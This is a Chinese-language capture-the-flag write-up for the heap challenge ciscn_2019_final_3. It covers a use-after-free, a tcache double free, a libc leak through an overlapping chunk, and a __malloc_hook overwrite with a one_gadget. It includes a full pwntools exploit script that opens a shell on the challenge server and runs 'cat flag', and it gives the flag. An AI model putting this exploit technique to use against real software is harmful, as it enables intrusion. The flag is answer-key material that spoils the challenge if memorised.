# ciscn_2019_final_3

[题目地址](https://buuoj.cn/challenges#ciscn_2019_final_3)

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

查看main函数，发现是c++，之前从来没有做过c++的pwn题。

```c++
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  int v4; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_C5A(a1, a2, a3);
  v3 = std::operator<<<std::char_traits<char>>(&std::cout, "welcome to babyheap");
  std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
  while ( 1 )
  {
    menu();
    std::operator<<<std::char_traits<char>>(&std::cout, "choice > ");
    std::istream::operator>>(&std::cin, &v4);
    if ( v4 == 1 )
    {
      add();
    }
    else if ( v4 == 2 )
    {
      remove();
    }
  }
}
```

就两个函数，add和remove。

```c++
unsigned __int64 add()
{
  __int64 v0; // rax
  __int64 v1; // rax
  unsigned int v2; // ebx
  __int64 v3; // rax
  size_t size; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+8h] [rbp-18h]

  v6 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "input the index");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, (char *)&size + 4);
  if ( *((_QWORD *)&heap + HIDWORD(size)) || HIDWORD(size) > 0x18 )
    exit(0);
  v1 = std::operator<<<std::char_traits<char>>(&std::cout, "input the size");
  std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &size);
  if ( (unsigned int)size <= 0x78 )
  {
    v2 = HIDWORD(size);
    *((_QWORD *)&heap + v2) = malloc((unsigned int)size);
    v3 = std::operator<<<std::char_traits<char>>(&std::cout, "now you can write something");
    std::ostream::operator<<(v3, &std::endl<char,std::char_traits<char>>);
    sub_CBB(*((_QWORD *)&heap + HIDWORD(size)), (unsigned int)size);
    puts("OK!");
    printf("gift :%p\n", *((const void **)&heap + HIDWORD(size)));
  }
  return __readfsqword(0x28u) ^ v6;
}
```

add函数的结构非常简单，就是申请一个堆块指针放进heap数组中，内容申请时就写入，后续没有edit操作。给出了gift，值是当前申请堆块的地址。

```c++
unsigned __int64 remove()
{
  __int64 v0; // rax
  unsigned int v2; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v3; // [rsp+8h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  v0 = std::operator<<<std::char_traits<char>>(&std::cout, "input the index");
  std::ostream::operator<<(v0, &std::endl<char,std::char_traits<char>>);
  std::istream::operator>>(&std::cin, &v2);
  if ( v2 > 0x18 )
    exit(0);
  free(*((void **)&heap + v2));
  return __readfsqword(0x28u) ^ v3;
}
```

uaf！先用unsroted bin泄露地址，算libc，然后覆盖`__malloc_hook`为system或者one_gadget，这种题基本都是这个思路。然而这题涉及了tcache，具体怎么搞还是看[wp](https://blog.csdn.net/mcmuyanga/article/details/113995633)吧。发现和c的pwn没啥区别，除了tcache这个新知识点该怎么利用怎么利用。

```python
from pwn import *

io=remote('node4.buuoj.cn',29002)

context.log_level='debug'

def add(idx,size,data):
    io.recvuntil('choice > ')
    io.sendline('1')
    io.recvuntil('the index')
    io.sendline(str(idx))
    io.recvuntil('the size')
    io.sendline(str(size))
    io.recvuntil('something')
    io.sendline(data)
    io.recvuntil('gift :')
    return int(io.recvline()[2:],16)

def free(idx):
    io.recvuntil('choice > ')
    io.sendline('2')
    io.recvuntil('the index')
    io.sendline(str(idx))   

heap=add(0,0x78,'a')#0
print(hex(heap)) #这个heap地址是堆块0的user data地址（fd）
add(1,0x18,'b')#1
add(2,0x78,'c')#2
add(3,0x78,'d')#3 
add(4,0x78,'c')#4
add(5,0x78,'d')#5 
add(6,0x78,'c')#6
add(7,0x78,'d')#7 
add(8,0x78,'c')#8
add(9,0x78,'d')#9 
add(10,0x78,'c')#10
add(11,0x78,'d')#11
add(12,0x28,'d')#12，其实我不知道申请这么多堆块是在干啥，也看了一个无需申请这么多堆块的wp。可能是多申请后好调试看看堆块结构

#gdb.attach(io)
#dup 
free(12) #tcache特色double free，直接free两次都不会出现问题。现在tcache里面 堆块12<-堆块12 堆块12自己的fd指向自己
free(12)
add(13,0x28,p64(heap-0x10))#4 修改为chunk0 prev_size的地址。这里add获取到了刚才的堆块12，因为user data域和fd是一样的地址，这里将其编辑为heap-0x10，即堆块0的prev_size地址。目前tcache链表 堆块0 prev_size<-堆块12
add(14,0x28,p64(heap-0x10))#5 再申请一次拿出堆块12，继续编辑为heap-0x10
add(15,0x28,p64(0)+p64(0x421))#因为之前改的fd，再申请就拿到chunk0的prev_size地址处了，编辑size要超过0x400，后续才能进unsorted bin

#overlap,堆块0包住了堆块1
free(0) #堆块0被改size后free进入unsort_bin。因为chunk0是unsored bin里唯一一个bin，其fd=libc
free(1) #进入tcache
add(16,0x78,'e')#7 0x78的大小，tcache里面那个堆块不够用，于是从unsortbin分下一块,后面依然在unsortbin里。但0x78大小被割出去后，接下来的就是chunk1了。chunk1由于被chunk0包住了，被看成了chunk0的一部分。因为chunk0还是unsorted bin里唯一的chunk，fd指针随即被写到分割后的部分的fd，这个位置刚好是chunk1的fd。
add(17,0x18,'f')#8 这里是tcache， get chunk1
libc_base=add(18,0x18,'g')-0x3ebca0#9 因为chunk1的fd在上面被改为了libc的地址，这里add就申请到那一块去了。程序又自动返回堆块所在地址，这个地址就是libc，减去一个固定的偏移就是libc_base。
malloc_hook=libc_base+4111408
one_gadget=libc_base+0x10a38c
print(hex(libc_base),hex(malloc_hook))

#dup
free(5) #故技重施，再次double_free
free(5)
add(19,0x78,p64(malloc_hook))  #把堆块5的fd改为malloc_hook，和上面一样的道理
add(20,0x78,p64(malloc_hook))
add(21,0x78,p64(one_gadget)) #这里申请到了malloc_hook的位置，更改为one_gadget
#getshell
io.sendline('1') #菜单选择add选项
io.sendline('22') #要申请的堆块编号
io.sendline('0;cat flag')

io.interactive()
```

给出无需申请这么多堆块的[wp](https://www.yuque.com/hxfqg9/bin/ms60xm)。

## Flag
> flag{96b435ac-fc5c-43ef-aaa0-41742c6bd0de}